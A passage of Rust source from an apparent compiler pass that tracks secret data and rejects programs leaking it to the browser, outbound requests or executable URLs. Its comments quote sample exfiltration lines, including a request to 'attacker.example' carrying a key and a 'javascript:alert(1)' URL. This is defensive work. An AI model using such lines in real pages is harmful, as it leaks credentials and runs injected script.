        // `text of` and `length of` — and §17.4.6 already governs those,
        // with a rule that says something different. And a secret that
        // reached client context at all crossed a boundary to get there,
        // where E-IFC-05 or E-IFC-06 has already reported it; raising a
        // second code for the same leak prints two repairs for one mistake.
        //
        // A `foreign … is client` is the case neither of those covers: it
        // is linked into the browser bundle by declaration, so the value
        // leaves the program at the call and there is no crossing anywhere
        // else to have caught it.
        let reaches_browser = foreign.site == zdc_ast::ForeignSite::Client;

        let mut joined = Sym::bottom();
        let mut trace = Vec::new();
        for (slot, expr, value) in &evaluated {
            joined.join_in_place(&value.label.value);
            trace = merge(&trace, &value.trace);
            let Some(index) = slot else {
                continue;
            };
            if !reaches_browser {
                continue;
            }
            self.oblige(Obligation {
                kind: ObligationKind::ForeignArgument(def, *index as u32),
                required: Secrecy::Public,
                found: value.label.value.clone(),
                pc: self.pc.clone(),
                site: self.ifc.hir.exprs[*expr].span,
                what: format!("the value written for `{}`", names[*index]),
                found_trace: value.trace.clone(),
                pc_trace: self.pc_trace.clone(),
            });
        }
        Valued::of(SymLabel::triple(joined), trace)
    }

    fn call(&mut self, callee: Res, args: &[HirArg], span: Span) -> Valued {
        // A variant constructor resolves to `Res::Variant`, not to a
        // definition with a body to summarise.
        let Res::Def(def) = callee else {
            return self.constructed(args);
        };
        // A `foreign` has no body to summarise, but it does have a rule of
        // its own: §14E.3 row 1 decides what may cross into it.
        if matches!(self.ifc.hir.defs[def].kind, DefKind::Foreign(_)) {
            return self.foreign(def, args);
        }
        // A record literal is `Todo with …`, which parses as a call.
        let DefKind::Function(function) = &self.ifc.hir.defs[def].kind else {
            return self.constructed(args);
        };
        // §17.6 item 12: matching a named argument to a parameter index is
        // five lines here, not a dependency on `zdc-types`.
        let names: Vec<String> = function
            .params
            .iter()
            .map(|param| self.ifc.hir.locals[*param].name.clone())
            .collect();
        let mut ordered: Vec<Option<ExprId>> = vec![None; names.len()];
        let mut next = 0usize;
        for arg in args {
            match arg {
                // An argument that matches no parameter is dropped rather
                // than walked, and that is deliberate: the callee cannot
                // read it, so it reaches neither the result nor any
                // obligation the callee raises. It is safe only because
                // `zdc-types` rejects the call outright — "`f` takes 1
                // argument(s), and this call passes more", "`f` has no
                // parameter named `x`" — so no such call ever reaches
                // emission. The split walks it regardless, so the read
                // table and E0360 still see it.
                HirArg::Positional(expr) => {
                    if next < ordered.len() {
                        ordered[next] = Some(*expr);
                        next += 1;
                    }
                }
                HirArg::Named { name, value } => {
                    if let Some(index) = names.iter().position(|param| param == name) {
                        ordered[index] = Some(*value);
                    }
                }
            }
        }

        let mut evaluated: Vec<Valued> = Vec::with_capacity(ordered.len());
        for slot in &ordered {
            evaluated.push(match slot {
                Some(expr) => self.expr(*expr),
                None => Valued::bottom(),
            });
        }
        let labels: Vec<SymLabel> = evaluated.iter().map(|v| v.label.clone()).collect();

        // A traced walk re-solves the callee, so an obligation raised
        // *inside* it can say which branch inside it raised the program
        // counter. The depth bound is what stops a recursive function
        // re-solving forever; past it the converged summary is used, which
        // is the same verdict with a shorter path.
        let summary = if self.tracing && self.depth < 3 {
            self.ifc.solve_function(def, self.ctx, true, self.depth + 1)
        } else {
            self.ifc
                .summaries
                .get(&(def, self.ctx))
                .cloned()
                .unwrap_or_default()
        };

        // Propagate the callee's obligations into this body, substituted.
        for (id, obligation) in summary.obligations {
            let mut instantiated = obligation.clone();
            instantiated.found = obligation.found.instantiate(&labels);
            instantiated.pc = obligation.pc.instantiate(&labels).join(&self.pc);
            instantiated.found_trace = merge(
                &self.witness_for(def, &obligation.found, &evaluated, span),
                &obligation.found_trace,
            );
            instantiated.pc_trace = merge(
                &merge(
                    &self.pc_trace,
                    &self.witness_for(def, &obligation.pc, &evaluated, span),
                ),
                &obligation.pc_trace,
            );
            self.oblige_at(id, instantiated);
        }

        let label = summary.result.instantiate(&labels);
        let trace = self.witness_for(def, &summary.result.value, &evaluated, span);
        Valued::of(label, trace)
    }

    /// The path a secret takes through a call: which argument carried it,
    /// and how that parameter reaches the result inside the callee.
    fn witness_for(&self, def: DefId, sym: &Sym, args: &[Valued], span: Span) -> Trace {
        if !self.tracing {
            return Vec::new();
        }
        let DefKind::Function(function) = &self.ifc.hir.defs[def].kind else {
            return Vec::new();
        };
        let mut out: Trace = Vec::new();
        for (index, obs) in &sym.deps {
            let Some(arg) = args.get(*index as usize) else {
                continue;
            };
            if arg.label.get(*obs).concrete() != Secrecy::Secret {
                continue;
            }
            out = merge(&out, &arg.trace);
            let param = function
                .params
                .get(*index as usize)
                .map(|local| self.ifc.hir.locals[*local].name.clone())
                .unwrap_or_else(|| format!("argument {}", index + 1));
            out = merge(&out, &vec![(span, format!("passed as `{param}`"))]);
            if let Some(inner) = self.ifc.param_paths.get(&(def, self.ctx, *index)) {
                out = merge(&out, inner);
            }
        }
        out
    }

    fn oblige(&mut self, obligation: Obligation) {
        let id = (obligation.site, obligation.kind);
        self.oblige_at(id, obligation);
    }

    /// Two obligations with the same identity are **joined**, not
    /// appended — which is what bounds a summary by the number of sites
    /// rather than by the number of rounds.
    fn oblige_at(&mut self, id: ObligationId, obligation: Obligation) {
        match self.obligations.get_mut(&id) {
            Some(existing) => {
                existing.found.join_in_place(&obligation.found);
                existing.pc.join_in_place(&obligation.pc);
                existing.found_trace = merge(&existing.found_trace, &obligation.found_trace);
                existing.pc_trace = merge(&existing.pc_trace, &obligation.pc_trace);
            }
            None => {
                self.obligations.insert(id, obligation);
            }
        }
    }

    // --- statements (§17.3.4's statement table) ---

    /// A block, grouped into runs of pipeline clauses exactly as
    /// `zdc-codegen`'s `Statements::block` groups them.
    ///
    /// The grouping is not cosmetic. Codegen closes every run with `return
    /// $p`, so the accumulator a run leaves behind is a **return**, in
    /// whatever `pc` is in force where the run stands. Walking the clauses
    /// and leaving the accumulator to be picked up only if nothing else
    /// gave is the same mistake `show` was: a body that both gives and
    /// pipes compiles to two returns and was labelled by one of them.
    fn block(&mut self, id: zdc_hir::BlockId) {
        let stmts = self.ifc.hir.blocks[id].stmts.clone();
        let span = self.ifc.hir.blocks[id].span;
        let mut index = 0;
        while index < stmts.len() {
            if matches!(stmts[index], HirStmt::Pipeline(_)) {
                while index < stmts.len() && matches!(stmts[index], HirStmt::Pipeline(_)) {
                    self.stmt(&stmts[index]);
                    index += 1;
                }
                let accumulated = self.acc.clone();
                self.returns(accumulated, span);
                continue;
            }
            self.stmt(&stmts[index]);
            index += 1;
        }
    }

    fn stmt(&mut self, stmt: &HirStmt) {
        match stmt {
            HirStmt::Pipeline(clause) => self.pipeline(clause),
            HirStmt::Give(expr) => self.gives(*expr),
            HirStmt::Mutation(mutation) => self.mutation(mutation),
            HirStmt::When(when) => {
                let scrutinee = self.expr(when.scrutinee);
                let outer_pc = self.pc.clone();
                let outer_pc_trace = self.pc_trace.clone();
                self.pc = outer_pc.join(&scrutinee.label.shape);
                if !scrutinee.label.shape.is_bottom() {
                    self.pc_trace = merge(
                        &merge(&outer_pc_trace, &scrutinee.trace),
                        &self.trace(vec![(
                            self.ifc.hir.exprs[when.scrutinee].span,
                            "which arm is taken depends on a secret  [control dependency]"
                                .to_string(),
                        )]),
                    );
                }

                let before = self.acc.clone();
                let mut merged: Option<Valued> = None;
                for arm in &when.arms {
                    // The `Failed` arm of a `Remote` binds the failure
                    // observation, not the value: §14G.1.3(d), and an HTTP
                    // client's error message routinely contains the URL,
                    // key and all.
                    let is_failure_arm = arm.pattern_name == "Failed";
                    let bound = if is_failure_arm {
                        scrutinee.label.failure.clone()
                    } else {
                        scrutinee.label.value.clone()
                    };
                    for binder in &arm.bindings {
                        self.locals.insert(
                            *binder,
                            Valued::of(SymLabel::triple(bound.clone()), scrutinee.trace.clone()),
                        );
                    }
                    self.note_binders(is_failure_arm, &arm.bindings);
                    self.acc = before.clone();
                    match &arm.body {
                        // `show` in statement position **is** the arm's
                        // result: `zdc-codegen` emits `return <expr>` for
                        // it, and a statement `when` is the last thing a
                        // function body does. Evaluating it and throwing
                        // the label away made every such function public
                        // by construction, so `when m / Direct show key`
                        // laundered a `secret` into a `server` signal that
                        // the browser then fetched. It is a `give`, under
                        // this arm's `pc`, and nothing less.
                        HirArmBody::Show(expr) => self.gives(*expr),
                        HirArmBody::Block(block) => self.block(*block),
                    }
                    merged = Some(match merged {
                        Some(previous) => previous.join(&self.acc),
                        None => self.acc.clone(),
                    });
                }
                self.acc = merged.unwrap_or(before);
                self.pc = outer_pc;
                self.pc_trace = outer_pc_trace;
            }
            HirStmt::Each(each) => {
                let iter = self.expr(each.iter);
                let outer_pc = self.pc.clone();
                let outer_pc_trace = self.pc_trace.clone();
                self.pc = outer_pc.join(&iter.label.shape);
                if !iter.label.shape.is_bottom() {
                    self.pc_trace = merge(&outer_pc_trace, &iter.trace);
                }
                self.locals.insert(
                    each.var,
                    Valued::of(
                        SymLabel::triple(iter.label.value.clone()),
                        iter.trace.clone(),
                    ),
                );
                let before = self.acc.clone();
                self.block(each.body);
                self.acc = before.join(&self.acc);
                self.pc = outer_pc;
                self.pc_trace = outer_pc_trace;
            }
            HirStmt::If(conditional) => {
                let cond = self.expr(conditional.cond);
                let outer_pc = self.pc.clone();
                let outer_pc_trace = self.pc_trace.clone();
                self.pc = outer_pc.join(&cond.label.value);
                if !cond.label.value.is_bottom() {
                    self.pc_trace = merge(
                        &merge(&outer_pc_trace, &cond.trace),
                        &self.trace(vec![(
                            self.ifc.hir.exprs[conditional.cond].span,
                            "the branch outcome depends on a secret  [control dependency]"
                                .to_string(),
                        )]),
                    );
                }

                let before = self.acc.clone();
                self.block(conditional.then);
                let after_then = self.acc.clone();
                self.acc = before.clone();
                if let Some(otherwise) = conditional.otherwise {
                    self.block(otherwise);
                }
                // §17.3.4: the accumulator's behaviour at a block boundary
                // is a join over every path, including the path that did
                // not run. Leaving it unspecified is what let `From` inside
                // an `if` erase a branch's control dependency.
                self.acc = before.join(&after_then).join(&self.acc);
                self.pc = outer_pc;
                self.pc_trace = outer_pc_trace;
            }
            // `with name is value`. A binding is a name for an expression,
            // so the local carries that expression's own label joined with
            // the `pc`: reaching the binding at all can depend on a secret
            // branch, and a name introduced under one is as secret as the
            // branch. Bindings are walked in order, so a later value that
            // reads an earlier name sees the label just recorded for it.
            HirStmt::Bind(bind) => {
                for binding in &bind.bindings {
                    let value = self.expr(binding.value);
                    let mut label = value.label;
                    label.join_all(&self.pc);
                    self.locals.insert(
                        binding.local,
                        Valued::of(label, merge(&value.trace, &self.pc_trace)),
                    );
                }
            }
            // `do <call>`. The call is evaluated and its label discarded,
            // which is exactly what `element` does for a `gives view`
            // foreign: there is no result, so there is nothing to label and
            // nothing to accumulate.
            //
            // **Evaluating it is not optional.** `self.expr` is what raises
            // E-IFC-13 on every argument of a `foreign … is client`, and
            // what records the reads inside those arguments. A statement
            // form that skipped the walk would be a hole shaped exactly
            // like the effect it exists to run: `do send with body is
            // apiKey` would compile silently, and the secret would be
            // through with nothing to have caught it. The accumulator is
            // deliberately untouched — an effect gives no value, so it
            // cannot be a block's result.
            HirStmt::Do(effect) => {
                let _ = self.expr(effect.call);
            }
        }
    }

    /// §17.3.4's `give` rule, shared by all three spellings of a return.
    ///
    /// `give <expr>` writes it, a statement `when`'s `show <expr>` arm
    /// writes it, and the end of a run of pipeline clauses writes the
    /// accumulator; all three compile to `return`, so all three join the
    /// value — under the `pc` in force where they stand — into the
    /// function's result.
    fn gives(&mut self, expr: ExprId) {
        let value = self.expr(expr);
        let span = self.ifc.hir.exprs[expr].span;
        self.returns(value, span);
    }

    /// The `give` rule over an already-walked value, for the return that
    /// has no expression of its own: a pipeline's accumulator.
    fn returns(&mut self, value: Valued, span: Span) {
        let mut label = value.label;
        label.join_all(&self.pc);
        let mut trace = value.trace;
        if !self.pc.is_bottom() {
            trace = merge(
                &merge(&trace, &self.pc_trace),
                &self.trace(vec![(span, "returned under that branch".to_string())]),
            );
        }
        self.result = self.result.join(&Valued::of(label, trace));
        self.gave = true;
    }

    fn pipeline(&mut self, clause: &HirPipeline) {
        match clause {
            // **A join, never an assignment.** This was the only rule in
            // the set that assigned rather than joined and the only one
            // that omitted `⊔ pc`; inside an `if`, `acc` was overwritten
            // with a fresh ⊥ and the branch's control dependency vanished.
            HirPipeline::From(expr) => {
                let value = self.expr(*expr);
                let mut label = value.label;
                label.join_all(&self.pc);
                self.acc = self
                    .acc
                    .join(&Valued::of(label, merge(&value.trace, &self.pc_trace)));
            }
            HirPipeline::Keep { var, cond } => {
                self.bind_element(*var);
                let predicate = self.expr(*cond);
                // A predicate's label joins onto the **collection** label,
                // not merely onto element values: §14G.1.3(b), and it is
                // what rejects `keep each v where <secret predicate>`
                // returning a "public" list of public rows.
                self.acc.label.shape.join_in_place(&predicate.label.value);
                self.acc.label.shape.join_in_place(&self.pc);
                self.acc.label.settle();
                self.acc.trace = merge(&merge(&self.acc.trace, &predicate.trace), &self.pc_trace);
            }
            HirPipeline::Sort { var, key } => {
                self.bind_element(*var);
                let key = self.expr(*key);
                // The permutation reveals the key.
                self.acc.label.shape.join_in_place(&key.label.value);
                self.acc.label.shape.join_in_place(&self.pc);
                self.acc.label.settle();
                self.acc.trace = merge(&merge(&self.acc.trace, &key.trace), &self.pc_trace);
            }
            HirPipeline::MapEach { var, to } => {
                self.bind_element(*var);
                let to = self.expr(*to);
                // Only `value`: a mapped list keeps a public length.
                self.acc.label.value.join_in_place(&to.label.value);
                self.acc.label.value.join_in_place(&self.pc);
                self.acc.trace = merge(&merge(&self.acc.trace, &to.trace), &self.pc_trace);
            }
            HirPipeline::TakeFirst(expr) => {
                let count = self.expr(*expr);
                self.acc.label.shape.join_in_place(&count.label.value);
                self.acc.label.shape.join_in_place(&self.pc);
                self.acc.label.settle();
                self.acc.trace = merge(&merge(&self.acc.trace, &count.trace), &self.pc_trace);
            }
            // `fold each n into total starting s to step` (#33). The one
            // clause that turns a sequence into a value, so the one whose
            // rule reads `shape` *into* a value rather than onto one.
            //
            // **The length is in the answer.** An empty list gives the
            // seed back and a list of three runs three steps, so a fold
            // over a list whose length is secret has a secret result even
            // when every element is public and the step ignores them
            // — `fold each n into total starting 0 to total + 1` *is* the
            // length. That is the `acc.label.shape` join, and without it
            // `keep each row where <secret>` followed by a fold would
            // launder the predicate the `keep` rule went to the trouble of
            // recording.
            //
            // What is deliberately *not* joined is `acc.label.value`. The
            // elements reach the answer through the binder and nowhere
            // else, and the binder already carries that label, so a step
            // that reads the element has joined it in and a step that
            // ignores it has not depended on it. Same precision argument
            // as `MapEach`'s, in the other direction.
            HirPipeline::Fold {
                item,
                total,
                starting,
                step,
            } => {
                let seed = self.expr(*starting);
                self.bind_element(*item);
                // The total holds the seed on the first step and the
                // previous step's answer on every later one, so its label
                // is a least fixed point — and **one application reaches
                // it**, which is why the step is walked once rather than
                // iterated. An expression's label is the join of the
                // labels of the leaves it reads, so the step's label as a
                // function of the total's is `c ⊔ L(total)` where the step
                // names the total and the constant `c` where it does not.
                // The least fixed point is then `c ⊔ seed` in the first
                // case and `c` in the second, and both are exactly what
                // one application from `L(total) := seed` gives.
                self.locals.insert(*total, seed.clone());
                let step = self.expr(*step);
                // `triple` throughout, so `shape ⊑ value` holds by
                // construction and there is nothing for `settle` to do:
                // what comes out is one value, and a value has no shape a
                // reader can observe apart from itself.
                let mut label = SymLabel::triple(self.acc.label.shape.clone());
                label.join_in_place(&SymLabel::triple(seed.label.value.clone()));
                label.join_in_place(&SymLabel::triple(step.label.value.clone()));
                label.join_all(&self.pc);
                self.acc = Valued::of(
                    label,
                    merge(
                        &merge(&self.acc.trace, &merge(&seed.trace, &step.trace)),
                        &self.pc_trace,
                    ),
                );
            }
        }
    }

    fn bind_element(&mut self, var: LocalId) {
        let element = SymLabel::triple(self.acc.label.value.clone());
        let trace = self.acc.trace.clone();
        self.locals.insert(var, Valued::of(element, trace));
    }

    /// §5.3a(a)'s write rule: `label(rhs) ⊔ ⨆ label(index) ⊔ pc ⊑
    /// label(place)`.
    ///
    /// This is the first time the language has had a mutation site outside
    /// a `client` handler; before scheduled execution and relational
    /// writes one could not exist, which is why §5.3 never needed it.
    fn mutation(&mut self, mutation: &HirMutation) {
        // Every verb writes the value into the place, so every verb raises
        // the same obligation. `append` and `remove` are §14B.2's
        // membership verbs: `append apiKey to auditLog` is §14G.1.3
        // exhibit 5, the unlabelled write target, and it is caught here.
        let (place, value) = match mutation {
            HirMutation::Set { place, value }
            | HirMutation::Add { place, value }
            | HirMutation::Subtract { place, value }
            | HirMutation::Append { place, value }
            | HirMutation::Remove { place, value } => (place, *value),
        };
        let rhs = self.expr(value);
        let mut found = rhs.label.value.clone();
        let mut trace = rhs.trace;
        for segment in &place.path {
            if let HirPathSeg::Index(expr) = segment {
                let index = self.expr(*expr);
                found.join_in_place(&index.label.value);
                trace = merge(&trace, &index.trace);
            }
        }

        let Res::Def(base) = place.base else {
            // A component's own state is a local, and writing a secret into
            // it puts the secret in browser memory just as writing a
            // `client` signal does. Nothing else a place can name is
            // storage, so nothing else raises an obligation.
            if let Res::Local(local) = place.base {
                if self.local_signals.contains(&local) {
                    let name = self.ifc.hir.locals[local].name.clone();
                    self.oblige(Obligation {
                        kind: ObligationKind::Escape(
                            Sink::ClientState,
                            SinkSite::ClientSignal(self.owner),
                        ),
                        required: Secrecy::Public,
                        found,
                        pc: self.pc.clone(),
                        site: place.span,
                        what: format!("the value written into `{name}`"),
                        found_trace: trace,
                        pc_trace: self.pc_trace.clone(),
                    });
                }
            }
            return;
        };
        if !matches!(self.ifc.hir.defs[base].kind, DefKind::Signal(_)) {
            return;
        }
        let required = self
            .ifc
            .declared
            .get(&base)
            .copied()
            .unwrap_or_default()
            .value;
        self.oblige(Obligation {
            kind: ObligationKind::Write(base),
            required,
            found,
            pc: self.pc.clone(),
            site: place.span,
            what: format!("the value written into `{}`", self.ifc.hir.defs[base].name),
            found_trace: trace,
            pc_trace: self.pc_trace.clone(),
        });
    }

    // --- the view (§17.3.6's view rules) ---

    fn nodes(&mut self, nodes: &[HirNode]) {
        for node in nodes {
            match node {
                HirNode::Element(element) => self.element(element),
                HirNode::Each(each) => {
                    let iter = self.expr(each.iter);
                    self.require_public(
                        &iter,
                        self.ifc.hir.exprs[each.iter].span,
                        "the collection this list iterates",
                    );
                    let outer = self.pc.clone();
                    self.pc = outer.join(&iter.label.shape);
                    self.locals.insert(
                        each.var,
                        Valued::of(
                            SymLabel::triple(iter.label.value.clone()),
                            iter.trace.clone(),
                        ),
                    );
                    let body = each.body.clone();
                    self.nodes(&body);
                    self.pc = outer;
                }
                HirNode::When(when) => {
                    let scrutinee = self.expr(when.scrutinee);
                    // Only `shape` is required: a `when` that matches and
                    // renders nothing leaks only which arm it took.
                    let shape_only = Valued::of(
                        SymLabel::triple(scrutinee.label.shape.clone()),
                        scrutinee.trace.clone(),
                    );
                    self.require_public(
                        &shape_only,
                        self.ifc.hir.exprs[when.scrutinee].span,
                        "which arm this `when` takes",
                    );
                    let outer = self.pc.clone();
                    self.pc = outer.join(&scrutinee.label.shape);
                    for arm in &when.arms {
                        let is_failure_arm = arm.pattern_name == "Failed";
                        let bound = if is_failure_arm {
                            scrutinee.label.failure.clone()
                        } else {
                            scrutinee.label.value.clone()
                        };
                        for binder in &arm.bindings {
                            self.locals.insert(
                                *binder,
                                Valued::of(
                                    SymLabel::triple(bound.clone()),
                                    scrutinee.trace.clone(),
                                ),
                            );
                        }
                        self.note_binders(is_failure_arm, &arm.bindings);
                        match &arm.body {
                            HirNodeArmBody::Show(element) => {
                                let element = element.clone();
                                self.element(&element);
                            }
                            HirNodeArmBody::Nodes(nodes) => {
                                let nodes = nodes.clone();
                                self.nodes(&nodes);
                            }
                        }
                    }
                    self.pc = outer;
                }
                // Whether these nodes are in the document is visible *in*
                // the document, so an `if` on a secret leaks exactly what a
                // `when` on one does (§17.3.6). Unlike `when` it is the
                // whole value that decides, not only the shape.
                HirNode::If(conditional) => {
                    let cond = self.expr(conditional.cond);
                    self.require_public(
                        &cond,
                        self.ifc.hir.exprs[conditional.cond].span,
                        "whether this `if` shows its nodes",
                    );
                    let outer = self.pc.clone();
                    self.pc = outer.join(&cond.label.value);
                    let then = conditional.then.clone();
                    self.nodes(&then);
                    if let Some(otherwise) = conditional.otherwise.clone() {
                        self.nodes(&otherwise);
                    }
                    self.pc = outer;
                }
                // A component instance's own state. Not a region boundary
                // (§14D.3): the cells live in whichever region the instance
                // landed in, so their initialisers are checked here, in
                // this context. Every one is `client` (§14D.1) and none may
                // be `secret`, so a secret reaching one is a secret in
                // browser memory.
                HirNode::Scope(scope) => {
                    let locals = scope.locals.clone();
                    for local in &locals {
                        let init = self.expr(local.init);
                        let name = self.ifc.hir.locals[local.local].name.clone();
                        self.require_client_state(
                            &init,
                            self.ifc.hir.exprs[local.init].span,
                            format!("what `{name}` starts as"),
                        );
                        self.local_signals.insert(local.local);
                        // The same recovery the view walk uses: the
                        // declaration was required public, so the rest of
                        // the walk reads it as public rather than
                        // reporting one leak at every use of it.
                        //
                        // **Preserving the rejected label instead was
                        // considered and refused**, on two grounds and one
                        // measurement.
                        //
                        // It would not report a second leak. It would
                        // report the same leak once more per *read* of the
                        // cell, for a program with one cause and one fix —
                        // which is the cascade `require_public` names, and
                        // which `zdc-types` avoids the same way with
                        // `Type::Unknown`. And it is not a soundness
                        // question in either direction: `require_client_state`
                        // has already obliged, so `has_errors` is true,
                        // `clearance` is `None`, and nothing is emitted.
                        //
                        // The measurement is the part worth writing down.
                        // `init` here is Public in **every program that can
                        // be written today**, so the reset is not currently
                        // observable at all: `read`'s `Crossing::Remote`
                        // arm is itself the sink, obliges at the read, and
                        // hands back `Sym::bottom()` — so every route by
                        // which a secret could reach browser-side code is
                        // already cut one step upstream of here. Replacing
                        // this line with `init` leaves all 766 tests
                        // passing and changes no diagnostic on any program
                        // in `examples/`. `no_cascade_from_a_component_local_cell`
                        // pins the property that makes that true; if it
                        // ever starts failing, a labelled value has reached
                        // a view local by some new route and this line
                        // becomes load-bearing rather than defensive.
                        self.locals.insert(local.local, Valued::bottom());
                    }
                    let body = scope.body.clone();
                    self.nodes(&body);
                }
                // Instantiation replaced every one of these with the nodes
                // nested under the call site, so none survives into a view.
                HirNode::Children(_) => {}
                HirNode::Handler(handler) => self.block(handler.body),
            }
        }
    }

    fn element(&mut self, element: &HirElement) {
        // A `foreign … gives view` is written here rather than called, and
        // the same rule applies to it in either position: what crosses into
        // a foreign is decided by §14E.3 row 1 and not by which spelling
        // reached it. Routed through `foreign` rather than through
        // `require_public` below, so the diagnostic is E-IFC-13 — "handed
        // to JavaScript in the browser" — rather than E-IFC-05's "would be
        // rendered", which is the wrong sentence and the wrong repair.
        if let Res::Def(def) = element.res {
            if matches!(self.ifc.hir.defs[def].kind, DefKind::Foreign(_)) {
                let _ = self.foreign(def, &element.args);
                let children = element.children.clone();
                self.nodes(&children);
                return;
            }
        }
        // A `Link`'s destination is written positionally and would be
        // invisible to a rule keyed on argument names — so `zdc-resolve`
        // lowers it under the attribute it becomes
        // (`zdc_hir::DESTINATION_ARGUMENT`). By the time the flow pass
        // walks an element there is no URL left in a slot, which is what
        // lets sink 7 range over names and still cover the commonest way
        // of writing a link.
        for arg in &element.args {
            let (expr, name) = match arg {
                HirArg::Positional(expr) => (*expr, None),
                HirArg::Named { name, value } => (
                    *value,
                    zdc_hir::is_url_attribute(name).then(|| name.clone()),
                ),
            };
            let span = self.ifc.hir.exprs[expr].span;
            if let Some(name) = name {
                // Set before the walk, not after: a `server` read inside
                // this expression raises its own escape and has to know
                // which sink it is escaping to.
                let outer = self.url_argument.replace(UrlPosition::Attribute {
                    expr,
                    argument: name.clone(),
                });
                let value = self.expr(expr);
                self.url_argument = outer;
                self.reject_executable_url(expr, &name, span);
                self.require_no_outbound_request(&value, expr, &name, &element.name, span);
                continue;
            }
            let value = self.expr(expr);
            self.require_public(&value, span, "this value");
        }
        // A two-way binding is a write on every keystroke, so it carries
        // the enclosing `pc` even though no `set` statement names it.
        if let Res::Builtin(Builtin::Element(builtin)) = element.res {
            if builtin.is_two_way() {
                if let Some(HirArg::Positional(expr)) = element.args.first() {
                    if let HirExprKind::Ref(Res::Def(def)) = self.ifc.hir.exprs[*expr].kind {
                        if matches!(self.ifc.hir.defs[def].kind, DefKind::Signal(_)) {
                            let required = self
                                .ifc
                                .declared
                                .get(&def)
                                .copied()
                                .unwrap_or_default()
                                .value;
                            self.oblige(Obligation {
                                kind: ObligationKind::Write(def),
                                required,
                                found: Sym::bottom(),
                                pc: self.pc.clone(),
                                site: element.span,
                                what: format!(
                                    "what the visitor types into `{}`",
                                    self.ifc.hir.defs[def].name
                                ),
                                found_trace: Vec::new(),
                                pc_trace: self.pc_trace.clone(),
                            });
                        }
                    }
                }
            }
        }
        let children = element.children.clone();
        self.nodes(&children);
    }

    /// §17.3.6's view require, with **explicit error recovery**: on a
    /// failure the label is replaced by Public for the remainder of the
    /// walk, exactly as `Type::Unknown` works in `zdc-types`. One
    /// diagnostic per secret scrutinee, no cascade — and the `pc` rule
    /// stays meaningful for the statement-position cases where it does the
    /// real work.
    fn require_public(&mut self, value: &Valued, span: Span, what: &str) {
        let found = value.label.value.concrete().join(self.pc.concrete());
        if found == Secrecy::Public && value.label.value.deps.is_empty() {
            return;
        }
        self.oblige(Obligation {
            kind: ObligationKind::Escape(Sink::View, SinkSite::ClientSignal(self.owner)),
            required: Secrecy::Public,
            found: value.label.value.clone(),
            pc: self.pc.clone(),
            site: span,
            what: what.to_string(),
            found_trace: value.trace.clone(),
            pc_trace: self.pc_trace.clone(),
        });
    }

    /// §14G.1.3(c) sink 7 — **the outbound request**.
    ///
    /// The view sink catches what a reader *sees*. This one catches what
    /// the browser *sends*, and they are different escapes: `Image source
    /// is apiKey` renders no visible text and appears in no response body,
    /// and the browser still issues `GET https://attacker.example/<key>`
    /// before anything is painted. An image with `display: none` leaks
    /// exactly as well as a visible one, which is why this cannot be
    /// folded into the view.
    ///
    /// Every attribute the browser dereferences is one of these
    /// (`zdc_hir::URL_ATTRIBUTES`), on every element rather than on the
    /// elements meant to have one — an unrecognised named argument becomes
    /// the attribute of that name, so a rule keyed on the element would
    /// have `Text src is apiKey` fall straight through it.
    ///
    /// Until this existed the case was caught only because code generation
    /// refused every `secret` outright. That is a blunt instrument in the
    /// wrong pass: it stops being sufficient the moment a `secret` is
    /// legitimately usable on the server, which `guestbook.zd` already
    /// requires.
    fn require_no_outbound_request(
        &mut self,
        value: &Valued,
        expr: ExprId,
        argument: &str,
        element: &str,
        span: Span,
    ) {
        let found = value.label.value.concrete().join(self.pc.concrete());
        if found == Secrecy::Public && value.label.value.deps.is_empty() {
            return;
        }
        let mut found_trace = value.trace.clone();
        found_trace = merge(
            &found_trace,
            &self.trace(vec![(
                span,
                format!(
                    "`{argument}` is a URL, so the browser fetches it — and the value chooses the \
                     host  [outbound request]"
                ),
            )]),
        );
        self.oblige(Obligation {
            kind: ObligationKind::Escape(
                Sink::OutboundRequest,
                SinkSite::UrlArgument(expr, self.ctx),
            ),
            required: Secrecy::Public,
            found: value.label.value.clone(),
            pc: self.pc.clone(),
            site: span,
            what: format!("what `{element}` fetches from `{argument}`"),
            found_trace,
            pc_trace: self.pc_trace.clone(),
        });
    }

    /// The same sink, at a `request` declaration's argument (#19).
    ///
    /// **The URL is the route people forget, and in this design every
    /// argument is the URL.** `with key is apiKey` is emitted as
    /// `?key=…` on the destination, so `fetch("https://x/?k=" + apiKey)`
    /// — a leak with no body at all — is exactly the program this refuses.
    /// There is no body clause and no header clause for a secret to take
    /// instead: the request is a `GET`, its headers are a constant of the
    /// runtime, and the destination is a literal. So this is the one route
    /// in, and it is checked rather than closed.
    ///
    /// Written as its own function rather than as a call to
    /// [`Self::require_no_outbound_request`] because the two differ in
    /// every string a reader sees. That one is about an element the
    /// browser dereferences and can name the element; a request has no
    /// element, and naming one would be a sentence about a program nobody
    /// wrote.
    fn require_no_outbound_argument(
        &mut self,
        value: &Valued,
        expr: ExprId,
        argument: &str,
        destination: &str,
        span: Span,
    ) {
        let found = value.label.value.concrete().join(self.pc.concrete());
        if found == Secrecy::Public && value.label.value.deps.is_empty() {
            return;
        }
        let found_trace = merge(
            &value.trace,
            &self.trace(vec![(
                span,
                format!(
                    "`{argument}` is sent to `{destination}` in the query string  [outbound                      request]"
                ),
            )]),
        );
        self.oblige(Obligation {
            kind: ObligationKind::Escape(
                Sink::OutboundRequest,
                SinkSite::RequestArgument(expr, self.ctx),
            ),
            required: Secrecy::Public,
            found: value.label.value.clone(),
            pc: self.pc.clone(),
            site: span,
            what: format!("what the request sends as `{argument}`"),
            found_trace,
            pc_trace: self.pc_trace.clone(),
        });
    }

    /// A URL literal whose scheme executes rather than fetches.
    ///
    /// §16.3.5's escaping argument covers markup and stops there: `&`,
    /// `<` and `>` cannot close a tag. A URL is not parsed as markup, and
    /// `javascript:alert(1)` contains nothing an HTML escaper would touch,
    /// so escaping it changes nothing at all. `setAttribute('href', v)`
    /// stores the value verbatim and the browser runs it on click.
    ///
    /// Settled here, at compile time, for every value the compiler can
    /// see. `runtime/dom.js`'s `safeUrl` is the same allowlist for the
    /// values it cannot — a value out of a signal or a record field — and
    /// rejecting rather than sanitising is right wherever the choice
    /// exists: a sanitiser turns a program the author got wrong into a
    /// link that silently goes nowhere.
    fn reject_executable_url(&mut self, expr: ExprId, argument: &str, span: Span) {
        // `style` is in `URL_ATTRIBUTES` because CSS `url(…)` is a request
        // the browser issues, so it is a *sink*; it is not itself a URL,
        // and a scheme is not what is written in it. Reading `color:red`
        // as a `color:` scheme is a wrong sentence rather than a missing
        // one — and the emitter refuses a `style` argument outright, so
        // the value never reaches the DOM either way.
        if argument == "style" {
            return;
        }
